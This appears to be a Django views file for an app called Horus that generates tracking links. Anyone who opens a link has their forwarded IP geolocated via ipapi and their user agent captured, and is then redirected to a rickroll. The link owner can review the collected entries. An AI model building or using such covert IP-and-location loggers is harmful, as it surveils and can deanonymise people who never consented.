from django.shortcuts import render, redirect, get_object_or_404
from django.views import View
import json
from .forms import FormularioHorus
from . import models
import ipapi
from django.contrib.auth.mixins import LoginRequiredMixin
import datetime
# Create your views here.

class Home(View):
    template_name = 'horus/home.html'

    def get(self, request):
        return render(request, self.template_name)

class getData(View):
    template_name = 'horus/get.html'
    form_class = FormularioHorus

    def get(self, request, id):
        form = self.form_class
        addres = request.META.get('HTTP_X_FORWARDED_FOR')
        userag = request.META.get('HTTP_USER_AGENT')
        location_data = ipapi.location(ip=addres)
        gemail = models.sendEmail.objects.filter(id=id)
        
        
        return render(request, self.template_name, {'data':location_data, 'email':gemail, 'form':form, 'user':userag })

    def post(self, request, id):
        email = get_object_or_404(models.sendEmail, id=id)
        
        form = self.form_class(request.POST, instance=email)
        if form.is_valid():
            form.save()

            return redirect('https://www.youtube.com/watch?v=dQw4w9WgXcQ')

        return render(request, self.template_name, {'form':form})


class getEmail(LoginRequiredMixin, View):
    template_name = 'horus/horus.html'
    form_class = FormularioHorus

    def get(self, request):
        form = self.form_class
        return render(request, self.template_name, {'form':form})

    def post(self, request):
        form = self.form_class(request.POST)
        if form.is_valid():
            form.save()
            id = form.instance.pk

            return redirect('link', id)
        
        return render(request, self.template_name)


class generateLink(LoginRequiredMixin ,View):
    template_name = 'horus/link.html'
    form_class = FormularioHorus
    
    def get(self, request, id):
        link = models.sendEmail.objects.filter(id=id)
        l = get_object_or_404(models.sendEmail, id=id)

        return render(request, self.template_name, {'link':link})


class observados(LoginRequiredMixin, View):
    template_name = 'horus/observados.html'
    
    def get(self, request):
        datos = models.sendEmail.objects.filter(email=request.user.email)
        return render(request, self.template_name, {'datos':datos})

